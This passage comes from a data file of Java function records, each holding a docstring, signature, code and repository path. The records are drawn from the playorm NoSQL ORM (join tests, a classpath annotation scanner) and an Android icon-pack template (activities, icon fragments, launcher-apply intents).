typedRow.getRowKeyString());\n\tAssert.assertEquals(\"acc1\", theJoinedRow.getRowKey());\n\t\n\trows.previous();\n\tjoinedRow = rows.getCurrent();\n\t\n\ttypedRow = joinedRow.get(0);\n\ttheJoinedRow = joinedRow.get(1);\n\t\n\tlog.info(\"joinedRow=\"+joinedRow);\n\tAssert.assertEquals(\"e\", typedRow.getView().getAlias());\n\tAssert.assertEquals(\"act1\", typedRow.getRowKeyString());\n\tAssert.assertEquals(\"acc1\", theJoinedRow.getRowKey());\n}", "path": "src\\test\\java\\com\\alvazan\\test\\TestJoins.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * that's my buddy! this is where all the discovery starts.\n * @param cl \n */\n", "func_signal": "public final void discover(ClassLoader cl)", "code": "{\n\tSet<String> processedAlready = new HashSet<String>();\n\t\n    URL[] resources = findResources(cl);\n    for (URL resource : resources) {\n    \tif(processedAlready.contains(resource.getPath()))\n    \t\tcontinue;\n    \t\n    \tprocessedAlready.add(resource.getPath());\n        try {\n            ResourceIterator itr = getResourceIterator(resource, getFilter());\n            \n            InputStream is = null;\n            while ((is = itr.next()) != null) {\n            \t// make a data input stream\n            \tDataInputStream dstream = new DataInputStream(new BufferedInputStream(is));\n                try {\n                \t// get java-assist class file\n                \tClassFile classFile = new ClassFile(dstream);\n                \t\n                \t// discover class-level annotations\n                \tdiscoverAndIntimateForClassAnnotations (classFile);\n                \t// discover field annotations\n                \tdiscoverAndIntimateForFieldAnnotations (classFile);\n                \t// discover method annotations\n                \tdiscoverAndIntimateForMethodAnnotations(classFile);\n                } finally {\n                \t dstream.close();\n                     is.close();\n                }\n            }\n        } catch (IOException e) {\n        \tthrow new RuntimeException(e);\n        }\n    }\n}", "path": "src\\main\\java\\com\\impetus\\annovention\\Discoverer.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "// defect #87\n", "func_signal": "@Test\npublic void testEmbeddedInheritance()", "code": "{\n    EmbeddedEmail sub = new EmbeddedEmail();\n    sub.setIdkey(67);\n    sub.setName(\"dean\");\n    sub.setType(\"nosqltype\");\n\n    EmbeddedEmail2 e2 = new EmbeddedEmail2();\n    e2.setIdkey(67);\n    e2.setName(\"name2\");\n    e2.setType(\"type2\");\n\n    User user = new User();\n    user.setEmail2(e2);\n    user.setEmail(sub);\n    mgr.fillInWithKey(e2);\n    mgr.fillInWithKey(sub);\n\n    mgr.put(user);\n    mgr.flush();\n\n}", "path": "src\\test\\java\\com\\alvazan\\test\\TestEmbedded.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//@Test\n", "func_signal": "public void testToOneWithUUID()", "code": "{\n\tAccount acc1 = new Account();\n\tacc1.setId(\"acc1\");\n\tacc1.setName(\"acc1name\");\n\tmgr.fillInWithKey(acc1);\n\n\tEntityWithUUIDKey entity = new EntityWithUUIDKey();\n\tentity.setSomething(\"something\");\n\tentity.setAccount(acc1);\n\tmgr.fillInWithKey(entity);\n\t// mgr.put(entity);\n\n\tUser user = new User();\n\tuser.setUuidEntity(entity);\n\n\tmgr.put(user);\n\tmgr.flush();\n\n\tUser user2 = mgr.find(User.class, user.getId());\n\tAssert.assertNotNull(user2);\n\tAssert.assertEquals(entity.getId(), user2.getUuidEntity().getId());\n}", "path": "src\\test\\java\\com\\alvazan\\test\\TestManyToOne.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "// ~~~~~~~~~~~\n/*\n * Retrieve the current entityManager\n */\n", "func_signal": "public static NoSqlEntityManager em()", "code": "{\n\tif (plugin2InClassPath) {\n\t\tClass<?> clazz;\n\t\t\ttry {\n\t\t\t\tclazz = Class.forName(\"com.alvazan.play2.NoSqlForPlay2\");\n\t\t\t\tNoSqlInterface noSql2 = (NoSqlInterface) clazz.newInstance();\n\t\t\t\treturn noSql2.em();\n\t\t\t} catch (ClassNotFoundException e) {\n\t\t\t\tthrow new RuntimeException(\"The play2 plugin class not found\");\n\t\t\t} catch (InstantiationException e) {\n\t\t\t\tthrow new RuntimeException(\"The play2 class can't be instantiated\");\n\t\t\t} catch (IllegalAccessException e) {\n\t\t\t\tthrow new RuntimeException(\"The play2 plugin class cannot be access\");\n\t\t\t}\n\t}\n\telse\n\t\treturn get().entityManager;\n}", "path": "src\\main\\java\\com\\alvazan\\play\\NoSql.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * This is setup to match postgres result we saw\n * @throws InterruptedException\n */\n", "func_signal": "@Test\npublic void testOuterJoinWithNullClause() throws InterruptedException", "code": "{\n\tNoSqlTypedSession s = mgr.getTypedSession();\n\t\n\tQueryResult result = s.createQueryCursor(\"select * FROM Activity as e LEFT JOIN e.account as a WHERE e.numTimes < 15 and (e.account = null or a.isActive = false)\", 50);\n\tList<ViewInfo> views = result.getViews();\n\tCursor<IndexColumnInfo> cursor = result.getCursor();\n\n\tViewInfo viewAct = views.get(0);\n\tViewInfo viewAcc = views.get(1);\n\tString alias1 = viewAct.getAlias();\n\tString alias2 = viewAcc.getAlias();\n\tAssert.assertEquals(\"e\", alias1);\n\tAssert.assertEquals(\"a\", alias2);\n\t\n\tAssert.assertTrue(cursor.next());\n\tcompareKeys(cursor, viewAct, viewAcc, \"act1\", \"acc1\");\n\tAssert.assertTrue(cursor.next());\n\tcompareKeys(cursor, viewAct, viewAcc, \"act5\", null);\n\tAssert.assertTrue(cursor.next());\n\tcompareKeys(cursor, viewAct, viewAcc, \"act7\", \"acc1\");\n\tAssert.assertFalse(cursor.next());\n\t\n\tCursor<List<TypedRow>> rows = result.getAllViewsCursor();\n\t\n\trows.next();\n\tList<TypedRow> joinedRow = rows.getCurrent();\n\t\n\tTypedRow typedRow = joinedRow.get(0);\n\tTypedRow theJoinedRow = joinedRow.get(1);\n\t\n\tlog.info(\"joinedRow=\"+joinedRow);\n\tAssert.assertEquals(\"e\", typedRow.getView().getAlias());\n\tAssert.assertEquals(\"act1\", typedRow.getRowKeyString());\n\tAssert.assertEquals(\"acc1\", theJoinedRow.getRowKey());\n\t\n    rows.next();\n    List<TypedRow> joinedRow1 = rows.getCurrent();\n    TypedRow typedRow1 = joinedRow1.get(0);\n    TypedRow theJoinedRow1 = joinedRow1.get(1);\n    log.info(\"joinedRow1= \"+joinedRow1);\n    Assert.assertEquals(\"e\", typedRow1.getView().getAlias());\n    Assert.assertEquals(\"act5\", typedRow1.getRowKeyString());\n    Assert.assertEquals(null, theJoinedRow1.getRowKey());\n\n    rows.next();\n    List<TypedRow> joinedRow2 = rows.getCurrent();\n    TypedRow typedRow2 = joinedRow2.get(0);\n    TypedRow theJoinedRow2 = joinedRow2.get(1);\n    log.info(\"joinedRow1= \"+joinedRow2);\n    Assert.assertEquals(\"e\", typedRow2.getView().getAlias());\n    Assert.assertEquals(\"act7\", typedRow2.getRowKeyString());\n    Assert.assertEquals(\"acc1\", theJoinedRow2.getRowKey());\n}", "path": "src\\test\\java\\com\\alvazan\\test\\TestJoins.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * @param intf\n * @return\n */\n", "func_signal": "private boolean ignoreScan(String intf)", "code": "{\n    for (String ignored : ignoredPackages) {\n        if (intf.startsWith(ignored + \".\")) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "src\\main\\java\\com\\impetus\\annovention\\FilterImpl.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * Gets the Resource iterator for URL with Filter.\n * \n * @param url\n * @param filter\n * @return\n * @throws IOException\n */\n", "func_signal": "private ResourceIterator getResourceIterator(URL resource, Filter filter) throws IOException", "code": "{\n\tURL url = resource;\n\tString urlString = url.toString();\n    if (urlString.endsWith(\"!/\")) {\n    \t//It must be a jar file since it has the !/\n        urlString = urlString.substring(4);\n        urlString = urlString.substring(0, urlString.length() - 2);\n        url = new URL(urlString);\n        return new JarFileIterator(url.openStream(), filter);\n    } else if (url.getProtocol().equals(\"file\")) {\n    \tString path = url.getPath();\n    \tString newPath = path.replace((CharSequence)\"%2520\", \" \");\n    \tFile f = new File(newPath);\n        if (f.isDirectory()) {\n            return new ClassFileIterator(f, filter);\n        } else {\n        \tthrow new RuntimeException(\"bug, how is this not a directory=\"+f.getAbsolutePath());\n        }\n    } else if (url.getProtocol().equals(\"vfs\")) {\n        URLConnection conn = new URL(urlString).openConnection();\n        VirtualFile vf = (VirtualFile) conn.getContent();\n        File contentsFile = vf.getPhysicalFile();\n        File dir = contentsFile.getParentFile();\n        String fileName = vf.getName();\n        File physicalFile = new File(dir, fileName);\n        if (urlString.indexOf(\"jar\") > 0) {\n            // Its a jar\n            InputStream is = new FileInputStream(physicalFile);\n            return new JarFileIterator(is, filter);\n        } else {\n            // Its a directory\n            return new ClassFileIterator(physicalFile, filter);\n        }\n\n    } else {\n        throw new IOException(\"Unable to understand protocol: \" + resource.getProtocol());\n    }\n}", "path": "src\\main\\java\\com\\impetus\\annovention\\Discoverer.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//\tpublic boolean hasAlias(String alias) {\n//\t\tif(primaryTable.getAlias().equals(alias))\n//\t\t\treturn true;\n//\t\telse if(secondaryTable.getAlias().equals(alias))\n//\t\t\treturn true;\n//\t\treturn false;\n//\t}\n", "func_signal": "public boolean hasView(ViewInfoImpl view)", "code": "{\n\t\tif(primaryTable == view)\n\t\t\treturn true;\n\t\telse if(secondaryTable == view)\n\t\t\treturn true;\n\t\treturn false;\n\t}", "path": "src\\main\\java\\com\\alvazan\\orm\\parser\\antlr\\JoinInfo.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/* @see com.impetus.annovention.Filter#accepts(java.lang.String) */\n", "func_signal": "@Override\npublic final boolean accepts(String filename2)", "code": "{\n\tString filename = filename2;\n    if (filename.endsWith(\".class\")) {\n        if (filename.startsWith(\"/\")) {\n            filename = filename.substring(1);\n        }\n        \n        if (!ignoreScan(filename.replace('/', '.'))) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "src\\main\\java\\com\\impetus\\annovention\\FilterImpl.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * An early test so we get errors on startup instead of waiting until runtime(a.k.a fail as fast as we can)\n */\n", "func_signal": "private Proxy testInstanceCreation(Class<?> clazz)", "code": "{\n\ttry {\n\t\tProxy inst = (Proxy) clazz.newInstance();\n\t\treturn inst;\n\t} catch (InstantiationException e) {\n\t\tthrow new RuntimeException(\"ARE YOU missing a default constructor on this class.  We Could not create proxy for type=\"+clazz, e);\n\t} catch (IllegalAccessException e) {\n\t\tthrow new RuntimeException(\"Could not create proxy for type=\"+clazz, e);\n\t}\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\impl\\meta\\scan\\ScannerForClass.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//Callback from one of the proxies to load the entire cache based\n//on a hit of getXXXXX (except for getId which doesn't need to go to database)\n", "func_signal": "public void loadCacheIfNeeded()", "code": "{\n\tif(cacheLoaded)\n\t\treturn;\n\t\n\tDboTableMeta metaDbo = metaClass.getMetaDbo();\n\tIndiceToVirtual virtKeys = new IndiceToVirtual(metaDbo, new ListWrappingCursor<byte[]>(keys));\n\tAbstractCursor<KeyValue<Row>> rows = session.find(metaDbo, virtKeys, false, true, null);\n\tString name = getClass().getSimpleName();\n\tif (log.isInfoEnabled())\n\t\tlog.info(name+\":just loaded rows for keylist(next convert to proxies)=\"+keys.size()+\" for field=\"+field);\n\tint counter = 0;\n\twhile(true) {\n\t\tcom.alvazan.orm.api.z8spi.iter.AbstractCursor.Holder<KeyValue<Row>> holder = rows.nextImpl();\n\t\tif(holder == null)\n\t\t\tbreak;\n\t\tKeyValue<Row> kv = holder.getValue();\n\t\tRow row = kv.getValue();\n\t\tif(row != null || metaDbo.isEmbeddable()) {\n\t\t\tHolder<T> h = (Holder) originalHolders.get(counter);\n\t\t\tT value = h.getValue();\n\t\t\tif(value instanceof NoSqlProxy) {\n\t\t\t\t//inject the row into the proxy object here to load it's fields\n\t\t\t\tmetaClass.fillInInstance(row, session, value);\n\t\t\t\t//((NoSqlProxy)value).__injectData(row);\n\t\t\t}\n\t\t}\n\t\t\n\t\tcounter++;\n\t}\n\tcacheLoaded = true;\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\impl\\meta\\data\\collections\\OurAbstractCollection.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//\t/**\n//\t * This is setup to match postgres result we saw\n//\t * @throws InterruptedException\n//\t */\n//\t@Test\n//\tpublic void testInnerJoinWithNullClause() throws InterruptedException {\n//\t\tNoSqlTypedSession s = mgr.getTypedSession();\n//\t\t\t\t\t\t\t\t\t\t\t\t \"select * FROM Activity as e INNER JOIN e.account as a WHERE e.numTimes < 15 and a.isActive = false\"\n//\t\tQueryResult result = s.createQueryCursor(\"select * FROM Activity as e INNER JOIN e.account as a WHERE e.numTimes < 15 and (e.account = null or a.isActive = false)\", 50);\n//\t\tList<ViewInfo> views = result.getViews();\n//\t\tCursor<IndexColumnInfo> cursor = result.getCursor();\n//\n//\t\tViewInfo viewAct = views.get(0);\n//\t\tViewInfo viewAcc = views.get(1);\n//\t\tString alias1 = viewAct.getAlias();\n//\t\tString alias2 = viewAcc.getAlias();\n//\t\tAssert.assertEquals(\"e\", alias1);\n//\t\tAssert.assertEquals(\"a\", alias2);\n//\t\t\n//\t\tAssert.assertTrue(cursor.next());\n//\t\tcompareKeys(cursor, viewAct, viewAcc, \"act1\", \"acc1\");\n//\t\tAssert.assertTrue(cursor.next());\n//\t\tcompareKeys(cursor, viewAct, viewAcc, \"act7\", \"acc1\");\n//\t\tAssert.assertFalse(cursor.next());\n//\t\t\n//\t\tCursor<List<TypedRow>> rows = result.getAllViewsCursor();\n//\t\t\n//\t\trows.next();\n//\t\tList<TypedRow> joinedRow = rows.getCurrent();\n//\t\t\n//\t\tTypedRow typedRow = joinedRow.get(0);\n//\t\tTypedRow theJoinedRow = joinedRow.get(1);\n//\t\t\n//\t\tlog.info(\"joinedRow=\"+joinedRow);\n//\t\tAssert.assertEquals(\"e\", typedRow.getView().getAlias());\n//\t\tAssert.assertEquals(\"act1\", typedRow.getRowKeyString());\n//\t\tAssert.assertEquals(\"acc1\", theJoinedRow.getRowKey());\n//\t}\n", "func_signal": "@Test\n\tpublic void testJoinViewButNoJoin() throws InterruptedException", "code": "{\n\t\tNoSqlTypedSession s = mgr.getTypedSession();\n\n\t\tQueryResult result = s.createQueryCursor(\"select * FROM Activity as e WHERE e.numTimes < 15\", 50);\n\t\tList<ViewInfo> views = result.getViews();\n\t\tAssert.assertEquals(1, views.size());\n\t\tCursor<IndexColumnInfo> cursor = result.getCursor();\n\n\t\tViewInfo viewAct = views.get(0);\n\t\tString alias1 = viewAct.getAlias();\n\t\tAssert.assertEquals(\"e\", alias1);\n\t\t\n\t\tAssert.assertTrue(cursor.next());\n\t\tcompareKeys2(cursor, viewAct, \"act1\");\n\t\tAssert.assertTrue(cursor.next());\n\t\tcompareKeys2(cursor, viewAct, \"act3\");\n\t\tAssert.assertTrue(cursor.next());\n\t\tcompareKeys2(cursor, viewAct, \"act5\");\n\t\tAssert.assertTrue(cursor.next());\n\t\tcompareKeys2(cursor, viewAct, \"act7\");\n\t\tAssert.assertFalse(cursor.next());\n\t\t\n\t\tCursor<List<TypedRow>> rows = result.getAllViewsCursor();\n\t\t\n\t\trows.next();\n\t\tList<TypedRow> joinedRow = rows.getCurrent();\n\t\tAssert.assertEquals(1, joinedRow.size());\n\t\t\n\t\tTypedRow typedRow = joinedRow.get(0);\n\n\t\tlog.info(\"joinedRow=\"+joinedRow);\n\t\tAssert.assertEquals(\"e\", typedRow.getView().getAlias());\n\t\tAssert.assertEquals(\"act1\", typedRow.getRowKeyString());\n\t}", "path": "src\\test\\java\\com\\alvazan\\test\\TestJoins.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n    \n    /** TODO\n     * Change array\n     */\n    addIcon(resources, packageName, R.array.playicons);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentPlay.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n    \n    /** TODO\n     * Change array\n     */\n    addIcon(resources, packageName, R.array.systemicons);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentSystem.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n    \n    /** TODO\n     * Change array\n     */\n    addIcon(resources, packageName, R.array.latesticons);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentLatest.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// This creates your About Dev Activity\n", "func_signal": "@Override\n  public void onCreate(Bundle savedInstanceState)", "code": "{\n  super.onCreate(savedInstanceState);\n  noTitle();\n  setContentView(R.layout.about_dev);  \n      \n      Typeface font1 = Typeface.createFromAsset(getAssets(), \"RobotoSlab-Regular.ttf\");\n      TextView txt1 = (TextView) findViewById(R.id.devFont);\n      txt1.setTypeface(font1); \n      TextView title1 = (TextView) findViewById(R.id.title1);\n      title1.setTypeface(font1); \n      TextView desc1 = (TextView) findViewById(R.id.description1);\n      desc1.setTypeface(font1); \n      TextView title2 = (TextView) findViewById(R.id.title2);\n      title2.setTypeface(font1); \n      TextView desc2 = (TextView) findViewById(R.id.description2);\n      desc2.setTypeface(font1); \n\n      gplus = (ImageButton) findViewById(R.id.gplus_button);\n      gplus.setOnClickListener(new OnClickListener() {\n              public void onClick(View v) {\n              \ttry {\n              \t\tfinal Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(\"https://plus.google.com/110748421773388678236/posts\"));\n              \t\tstartActivity(intent);\n              \t} \n              \tcatch (RuntimeException gp) {\n              \t\tgp.printStackTrace();\n              \t}\t\n              }\n      });\n      \n      twitter = (ImageButton) findViewById(R.id.twitter_button);\n      twitter.setOnClickListener(new OnClickListener() {\n              public void onClick(View v) {\n              \ttry {\n              \t\tfinal Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(\"http://twitter.com/the1dynasty\"));\n              \t\tstartActivity(intent);\n              \t} \n              \tcatch (RuntimeException tw) {\n              \t\ttw.printStackTrace();\n              \t}\t\n              }\n      });\n      \n      facebook = (ImageButton) findViewById(R.id.facebook_button);\n      facebook.setOnClickListener(new OnClickListener() {\n              public void onClick(View v) {\n              \ttry {\n              \t\tfinal Intent intent = new Intent(Intent.ACTION_VIEW).setData(Uri.parse(\"https://www.facebook.com/pages/The1dynasty/428692913887012\"));\n              \t\tstartActivity(intent);\n              \t} \n              \tcatch (RuntimeException tw) {\n              \t\ttw.printStackTrace();\n              \t}\t\n              }\n      });\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\AboutDev.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "/**\n * Checks to see if the specified package is installed.<br>\n * Return true if it is or false if it's not installed.\n * \n * @param packageName\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isPackageInstalled(String packageName, Context context)", "code": "{\n\tPackageManager pm = context.getPackageManager();\n\t\n\ttry {\n\t\tpm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);\n\t\treturn true;\n\t}\n\tcatch (PackageManager.NameNotFoundException e) {\n\t\treturn false;\n\t}\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\util\\Utils.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadDocks()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getApplication().getPackageName();\n\n    addDocks(resources, packageName, R.array.dock_pack);\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\Docks.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// Starts the Activity for the list view\n", "func_signal": "@Override\nprotected void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\tsetContentView(R.layout.apply_launcher_main);\n\t\n\tgetSupportFragmentManager().beginTransaction()\n\t.replace(R.id.container_launcher, \n\t\t\tnew ApplyLauncherFragment())\n\t.commit();\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\ApplyLauncherMain.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n/** TODO\n * Change array\n */\n    addIcon(resources, packageName, R.array.miscicons);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentMisc.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// Starts the Activity for the gridview\n", "func_signal": "@Override\nprotected void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\t\n\tprefs = getSharedPreferences(getResources().getString(R.string.theme_name), 0);\n\tcheckBuild();\n\n\thelper = new GlassActionBarHelper().contentLayout(R.layout.gridview_main);\n\tsetContentView(helper.createView(this));\n\t\n\tgetSupportActionBar().setDisplayShowHomeEnabled(true); // Set this to false to hide AB Icon\n\tgetSupportActionBar().setDisplayShowTitleEnabled(true); // Set this to false to hide AB Title\n\t\n\tgetSupportFragmentManager().beginTransaction()\n\t.replace(R.id.container, new MainFragment())\n\t.commit();\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\MainActivity.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// Starts when the MainFragment is launched\n", "func_signal": "@Override\npublic void onActivityCreated(Bundle savedInstanceState)", "code": "{\n\tsuper.onActivityCreated(savedInstanceState);\n\t\n/* \n * This part does two things\n * First - It counts the number of items and displays them\n * Second - It displays the text in the \"\" which is a brief description of that item\n * Removing any of these will remove that item but be sure to edit ALL the cases below or your list\n * won't line up properly\n */\n\t\n\t/**\n\t ** NOTE: in order to have different views on tablet vs phones, I added an if/else statement to this\n\t ** section. Be sure to remove BOTH parts to remove it from phones and tablets. Failure to remove both\n\t ** parts will result in the app functioning differently on phones and tablets.\n\t **/\n\n\t/* \n\t * Sets the Title and description text for each GridView item\n\t * Check res/values/strings.xml to change text to whatever you want each GridView to say\n\t */\n\tboolean tabletSize = getResources().getBoolean(R.bool.isTablet);\n\tif (tabletSize) {\n\t\tgridView = (ScrollGridView)getView().findViewById(R.id.grid);\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_apply), \n\t\t\t\tgetResources().getString (R.string.desc_apply), 0));\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_walls), \n\t\t\t\tgetResources().getString (R.string.desc_walls), 1));\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_request), \n\t\t\t\tgetResources().getString (R.string.desc_request), 2));\n\t\tlistOfStuff.remove(new AdapterItem(getResources().getString (R.string.title_info), \n\t\t\t\tgetResources().getString (R.string.desc_info), 3));\n\n\t\t\n\t} else {\n\t\tgridView = (ScrollGridView)getView().findViewById(R.id.grid);\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_apply), \n\t\t\t\tgetResources().getString (R.string.desc_apply), 0));\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_walls), \n\t\t\t\tgetResources().getString (R.string.desc_walls), 1));\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_request), \n\t\t\t\tgetResources().getString (R.string.desc_request), 2));\n\t\tlistOfStuff.add(new AdapterItem(getResources().getString (R.string.title_info), \n\t\t\t\tgetResources().getString (R.string.desc_info), 3));\n\t}\n\n\t/**\n\t ** NOTE: in order to have different views on tablet vs phones, I added an if/else statement to this\n\t ** section. Be sure to remove both parts to remove it from phones and tablets. Failure to remove both\n\t ** parts will result in the app functioning differently on phones and tablets.\n\t **/\n\t\tMainAdapter adapter = new MainAdapter(getActivity(), listOfStuff);\n\n\t\tgridView.setAdapter(adapter);\n\t\tgridView.setExpanded(true);\n\t\tgridView.setOnItemClickListener(new OnItemClickListener() {\n\t\t\tpublic void onItemClick(AdapterView<?> parent, View v, int position, long id) {\n\t\t\t\t\n\t\t\t\t@SuppressWarnings(\"unused\")\n\t\t\t\tMainFragment gridContentT = null;\n\t\t\t\t\n\t\t\t\tboolean tabletSize = getResources().getBoolean(R.bool.isTablet);\n\t\t\t\tif (tabletSize) { // For TABLETS\n\t\t\t\t\t\n\t\t\t\t\tswitch (position) {\n\t\t\t\tcase APPLY:\n\t\t\t\t\tIntent launcher = new Intent(getSherlockActivity(), ApplyLauncherMain.class);\n\t\t\t\t\tstartActivity(launcher);\n\t\t        \tbreak;\n\t\t\t\tcase WALLPAPER:\n\t\t\t\t\tIntent wall = new Intent(getSherlockActivity(), Wallpaper.class);\n\t\t\t\t\tstartActivity(wall);\n\t\t        \tbreak;\n\t\t\t\tcase REQUEST:\n\t\t\t\t\tIntent request = new Intent(getSherlockActivity(), RequestActivity.class);\n\t\t\t\t\tstartActivity(request);\n\t\t        \tbreak;\n\t\t\t\t\t}\t\n\t\t\t} else {\t// For PHONES\n\t\t\t\tswitch (position) {\n\t\t\t\tcase APPLY:\n\t\t\t\t\tIntent launcher = new Intent(getSherlockActivity(), ApplyLauncherMain.class);\n\t\t\t\t\tstartActivity(launcher);\n\t        \t\tbreak;\n\t\t\t\tcase WALLPAPER:\n\t\t\t\t\tIntent wall = new Intent(getSherlockActivity(), Wallpaper.class);\n\t\t\t\t\tstartActivity(wall);\n\t        \t\tbreak;\n\t\t\t\tcase REQUEST:\n\t\t\t\t\tIntent request = new Intent(getSherlockActivity(), RequestActivity.class);\n\t\t\t\t\tstartActivity(request);\n\t        \t\tbreak;\n\t\t\t\tcase THEMEINFO:\n\t\t\t\t\tIntent aboutTheme = new Intent(getSherlockActivity(), AboutThemeActivity.class);\n\t\t\t\t\tstartActivity(aboutTheme);\n\t        \t\tbreak;\n\t        \t\t\n\t\t\t\t}\n\t\t\t}\n\t\t\t}\t\n\t\t});\n\t\t\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\MainFragment.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// Starts when the MainFragment is launched\n", "func_signal": "@Override\npublic void onActivityCreated(Bundle savedInstanceState)", "code": "{\n\tsuper.onActivityCreated(savedInstanceState);\n\n\tapplyLauncher.add(ApplyLauncherAdapter.APEX);\n\tapplyLauncher.add(ApplyLauncherAdapter.NOVA);\n\tapplyLauncher.add(ApplyLauncherAdapter.AVIATE);\n\tapplyLauncher.add(ApplyLauncherAdapter.ADW);\n\tapplyLauncher.add(ApplyLauncherAdapter.ACTION);\n\tapplyLauncher.add(ApplyLauncherAdapter.SMART);\n\tapplyLauncher.add(ApplyLauncherAdapter.NEXT);\n\tapplyLauncher.add(ApplyLauncherAdapter.GO);\n\tapplyLauncher.add(ApplyLauncherAdapter.HOLO);\n\n\tApplyLauncherAdapter adapter = new ApplyLauncherAdapter(getActivity(),\n\t\t\tapplyLauncher);\n\n\tgridView.setAdapter(adapter);\n\tgridView.setOnItemClickListener(new OnItemClickListener() {\n\t\tpublic void onItemClick(AdapterView<?> parent, View v,\n\t\t\t\tint position, long id) {\n\n\t\t\tfinal String ACTION_APPLY_ICON_THEME = \"com.teslacoilsw.launcher.APPLY_ICON_THEME\";\n\t\t\tfinal String NOVA_PACKAGE = \"com.teslacoilsw.launcher\";\n\t\t\tfinal String EXTRA_ICON_THEME_PACKAGE = \"com.teslacoilsw.launcher.extra.ICON_THEME_PACKAGE\";\n\t\t\tfinal String EXTRA_ICON_THEME_TYPE = \"com.teslacoilsw.launcher.extra.ICON_THEME_TYPE\";\n\t\t\tfinal String APEX_ACTION_SET_THEME = \"com.anddoes.launcher.SET_THEME\";\n\t\t\tfinal String APEX_EXTRA_PACKAGE_NAME = \"com.anddoes.launcher.THEME_PACKAGE_NAME\";\n\t\t\tfinal String AVIATE_ACTION_SET_THEME = \"com.tul.aviate.SET_THEME\";\n\t\t\tfinal String AVIATE_EXTRA_PACKAGE_NAME = 